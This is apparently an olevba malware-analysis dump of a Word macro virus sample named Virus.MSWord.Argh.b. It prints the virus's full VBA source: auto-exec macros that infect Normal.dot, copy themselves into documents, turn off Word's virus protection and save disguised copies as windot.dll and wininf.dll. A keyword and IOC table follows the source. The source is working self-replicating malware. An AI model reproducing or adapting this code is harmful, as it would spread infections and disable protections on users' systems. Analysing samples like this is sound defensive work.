olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Argh.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Argh.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: ./Virus.MSWord.Argh.b - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub infect(m)
Attribute infect.VB_Description = "Macro created 01/19/98 by chandana"
Attribute infect.VB_ProcData.VB_Invoke_Func = "TemplateProject.NewMacros.infect"
Application.DisplayAlerts = wdAlertsNone
d = Assistant.Animation
Assistant.Animation = msoAnimationGetTechy
getnormal (1)
Assistant.Animation = d
End Sub

Sub deletenormal(m)
Attribute deletenormal.VB_Description = "Macro recorded 01/23/98 by chandana"
Attribute deletenormal.VB_ProcData.VB_Invoke_Func = "TemplateProject.NewMacros.copymacrotonormaldot"
On Error GoTo e
    Application.OrganizerRename Source:= _
        NormalTemplate.FullName, name:= _
        "NewMacros", NewName:="oldNewMacros", Object:= _
        wdOrganizerObjectProjectItems
e:
End Sub
Sub copymacro(m)
Attribute copymacro.VB_Description = "Macro recorded 01/23/98 by chandana"
Attribute copymacro.VB_ProcData.VB_Invoke_Func = "TemplateProject.NewMacros.copymacro"
On Error GoTo eco
    Application.OrganizerCopy Source:= _
        ActiveDocument.FullName, Destination:= _
        NormalTemplate.FullName, name:= _
        "NewMacros", Object:=wdOrganizerObjectProjectItems
eco:
End Sub

Sub replicate(m)
Attribute replicate.VB_Description = "Macro recorded 01/23/98 by chandana"
Attribute replicate.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.repl"
If Int((50 * Rnd) + 1) = 25 Then
   Set a = Assistant.NewBalloon
   a.Heading = "Help me"
   a.Text = "I'm not feeling very vell .. AAARGHH!!!"
   a.Show
   End If
On Error GoTo re
    With ActiveDocument
        .AttachedTemplate = "Normal.dot"
    End With
    Application.OrganizerCopy Source:= _
        NormalTemplate.FullName, Destination:= _
        ActiveDocument.FullName, name:="NewMacros", _
        Object:=wdOrganizerObjectProjectItems
re:
End Sub
Sub AutoNew()
infect (1)
replicate (1)
runmacro ("AutoNew")
End Sub
Sub AutoClose()
infect (1)
replicate (1)
runmacro ("AutoClose")
End Sub
Sub autoopen()
infect (1)
replicate (1)
runmacro ("autoopen")
End Sub
Sub AutoExit()
infect (1)
replicate (1)
runmacro ("AutoExit")
End Sub

Sub restoreoriginal(m)
Attribute restoreoriginal.VB_Description = "Macro recorded 01/28/98 by chandana"
Attribute restoreoriginal.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.restoreoriginal"
On Error GoTo rr1:
    Application.OrganizerDelete Source:= _
        NormalTemplate.FullName, name:= _
        "NewMacros", Object:=wdOrganizerObjectProjectItems
rr1:
 On Error GoTo rro:
    Application.OrganizerRename Source:= _
        NormalTemplate.FullName, name:= _
        "oldNewMacros", NewName:="NewMacros", Object:= _
        wdOrganizerObjectProjectItems
rro:
End Sub
Sub recopy(m)
On Error GoTo eco
    reren (1)
    Application.OrganizerCopy Source:= _
        Options.DefaultFilePath(wdProgramPath) + Application.PathSeparator + "wininf.dll", Destination:= _
        NormalTemplate.FullName, name:= _
        "NewMacros", Object:=wdOrganizerObjectProjectItems
eco:
End Sub
Sub reren(m)
On Error GoTo rre
Application.OrganizerRename Source:= _
        NormalTemplate.FullName, name:= _
        "NewMacros", NewName:="oldNewMacros", Object:= _
        wdOrganizerObjectProjectItems
rre:
End Sub
Sub getnormal(m)
virusflag = System.PrivateProfileString("prncfg.ini", "Printer Port", "PortNumber")
Options.VirusProtection = False
If virusflag = "" Then
   System.PrivateProfileString("prncfg.ini", "Printer Port", "PortNumber") = "340"
   NormalTemplate.OpenAsDocument                                  'save normal.dot to windot.dll
   ActiveDocument.SaveAs FileName:=Options.DefaultFilePath(wdProgramPath) + Application.PathSeparator + "windot.dll"
   ActiveDocument.Close
   deletenormal (1)
   copymacro (1)
   NormalTemplate.OpenAsDocument
   ActiveDocument.SaveAs FileName:=Options.DefaultFilePath(wdProgramPath) + Application.PathSeparator + "wininf.dll" 'save infected dot
   ActiveDocument.Close
End If
End Sub
Sub runmacro(m)
On Error GoTo rme
Application.Run "Normal.oldNewMacros." + m
rme:
End Sub
Sub stealth()
ToolsMacro
MsgBox "stealth"
End
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |wininf.dll          |Executable file name                         |
|IOC       |windot.dll          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

